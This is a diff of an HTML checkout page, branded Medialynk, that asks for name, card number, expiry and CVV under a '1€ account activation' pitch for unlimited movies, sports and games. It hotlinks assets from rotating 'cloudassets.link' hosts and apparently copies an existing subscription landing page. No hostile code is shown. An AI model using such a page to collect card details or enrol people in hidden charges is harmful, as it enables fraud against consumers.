@@ -5,67 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Account Activation</title>
     <link rel="stylesheet" href="styles.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
+    <header id="header" data-testid="header" class="header-background">
+        <div class="header-wrapper">
+            <img data-testid="logo" class="logo" src="https://compliance.cloudassets.link/rotation/prod/medialynk.net/images/logo-dark.svg" alt="logo">
+        </div>
+    </header>
+    
     <div class="container">
         <div class="payment-card">
-            <div class="security-header">
-                <span class="lock-icon">🔒</span>
-                <span class="security-text">Secure and Encrypted 256-bit TLS verification</span>
+            <div class="secure-banner" data-testid="banner-secure">
+                <img src="https://lpbp.cloudassets.link/billing/assets/shield-check.png" alt="secure-icon" class="secure-icon" data-testid="secure-icon">
+                <p class="secure-text" data-testid="secure-text">
+                    <span><b>Secure</b> and <b>Encrypted</b> 256-bit TLS verification</span>
+                </p>
             </div>
 
-            <div class="activation-box">
+            <div class="activation-container">
                 <div class="activation-header">
-                    <h2>Activation of your account</h2>
-                    <span class="price">1€</span>
-                </div>
-                <p class="activation-info">Your card will be billed only 1€ to activate your account.</p>
-                
-                <div class="benefits">
-                    <div class="benefit-icons">
-                        <span class="benefit-icon">➕</span>
-                        <span class="benefit-icon">➕</span>
+                    <div class="activation-account">
+                        <h2 class="activation-title">Activation of your account</h2>
+                        <span class="activation-price">1€</span>
                     </div>
-                    <p class="benefit-text">Unlimited access to movies, sports, games, audiobooks and more.</p>
+                    <p class="activation-info">Your card will be billed only 1€ to activate your account.</p>
+                
+                    <div class="benefits-container">
+                        <div class="benefits-icons-wrapper">
+                            <div class="benefits-icons-row">
+                                <div class="benefit-icon-container">
+                                    <img src="https://lpbp.cloudassets.link/billing/assets/music.png" class="benefit-icon">
+                                </div>
+                                <div class="benefit-icon-container">
+                                    <img src="https://lpbp.cloudassets.link/billing/assets/video-game.png" class="benefit-icon">
+                                </div>
+                            </div>
+                            <div class="benefits-icons-row">
+                                <div class="benefit-icon-container">
+                                    <img src="https://lpbp.cloudassets.link/billing/assets/sport.png" class="benefit-icon">
+                                </div>
+                                <div class="benefit-icon-container">
+                                    <img src="https://lpbp.cloudassets.link/billing/assets/camera-video.png" class="benefit-icon">
+                                </div>
+                            </div>
+                        </div>
+                        <p class="benefits-text">Unlimited access <b>to movies, sports, games, audiobooks</b> and more.</p>
+                    </div>
                 </div>
             </div>
 
             <div class="divider"></div>
 
+            <div id="error-container" class="error-container" style="display: none;">
+                <!-- Error messages will be added dynamically -->
+            </div>
+
             <form id="payment-form">
                 <div class="form-group">
-                    <label for="card-name">Name on the card</label>
+                    <label for="fname">Name on the card</label>
                     <div class="name-inputs">
-                        <input type="text" id="first-name" placeholder="First name">
-                        <input type="text" id="last-name" placeholder="Last name">
+                        <div class="input-container">
+                            <div class="mandatory-message" style="display: none;">This is mandatory</div>
+                            <input type="text" id="fname" placeholder="First name">
+                            <span class="valid-icon" style="display: none;">✓</span>
+                            <span class="invalid-icon" style="display: none;">⚠</span>
+                        </div>
+                        <div class="input-container">
+                            <div class="mandatory-message" style="display: none;">This is mandatory</div>
+                            <input type="text" id="lname" placeholder="Last name">
+                            <span class="valid-icon" style="display: none;">✓</span>
+                            <span class="invalid-icon" style="display: none;">⚠</span>
+                        </div>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label for="card-number">Card number</label>
+                    <label for="rg_Cardno">Card number</label>
                     <div class="card-number-container">
-                        <input type="text" id="card-number" placeholder="Your card number">
-                        <div class="card-icons">
-                            <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-aj1pUS9bJjz4STyUYcjs8AYXQWw4YM.png" alt="Visa" class="card-icon visa">
-                            <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-aj1pUS9bJjz4STyUYcjs8AYXQWw4YM.png" alt="Mastercard" class="card-icon mastercard">
-                        </div>
+                        <div class="mandatory-message" style="display: none;">Invalid card number</div>
+                        <input type="text" id="rg_Cardno" placeholder="Your card number">
+                        <div class="card-icons"></div>
                     </div>
                 </div>
 
                 <div class="form-row">
                     <div class="form-group expiry">
-                        <label for="expiry-month">Expiry month</label>
-                        <input type="text" id="expiry-month" placeholder="MM">
+                        <label for="expiryMonth">Expiry month</label>
+                        <div class="select-container">
+                            <div class="mandatory-message" style="display: none;">Invalid</div>
+                            <select id="expiryMonth">
+                                <option value="">MM</option>
+                                <option value="01">01-Jan</option>
+                                <option value="02">02-Feb</option>
+                                <option value="03">03-Mar</option>
+                                <option value="04">04-Apr</option>
+                                <option value="05">05-May</option>
+                                <option value="06">06-Jun</option>
+                                <option value="07">07-Jul</option>
+                                <option value="08">08-Aug</option>
+                                <option value="09">09-Sep</option>
+                                <option value="10">10-Oct</option>
+                                <option value="11">11-Nov</option>
+                                <option value="12">12-Dec</option>
+                            </select>
+                        </div>
                     </div>
                     <div class="form-group expiry">
-                        <label for="expiry-year">Expiry year</label>
-                        <input type="text" id="expiry-year" placeholder="YYYY">
+                        <label for="expiryYear">Expiry year</label>
+                        <div class="select-container">
+                            <div class="mandatory-message" style="display: none;">Invalid</div>
+                            <select id="expiryYear">
+                                <option value="">YYYY</option>
+                                <!-- Years will be added dynamically via JavaScript -->
+                            </select>
+                        </div>
                     </div>
                     <div class="form-group security">
-                        <label for="security-code">Security code</label>
+                        <label for="cvv">Security code</label>
                         <div class="security-code-container">
-                            <input type="text" id="security-code" placeholder="3-4 digits">
-                            <span class="info-icon">ℹ️</span>
+                            <div class="mandatory-message" style="display: none;">Invalid</div>
+                            <input type="text" id="cvv" placeholder="3-4 digits">
+                            <img src="https://lpbp.cloudassets.link/billing/assets/information.png" alt="Info" class="info-icon">
                         </div>
                     </div>
                 </div>
@@ -83,7 +144,6 @@
 
                 <button type="submit" class="continue-btn">
                     CONTINUE
-                    <span class="arrow">›</span>
                 </button>
             </form>
 
@@ -92,6 +152,13 @@
             </div>
         </div>
     </div>
+    
+    <footer data-testid="footer" class="footer">
+        <div class="footer-wrapper">
+            <p class="footer-text">© Medialynk 2025</p>
+        </div>
+    </footer>
+    
     <script src="script.js"></script>
 </body>
 </html>
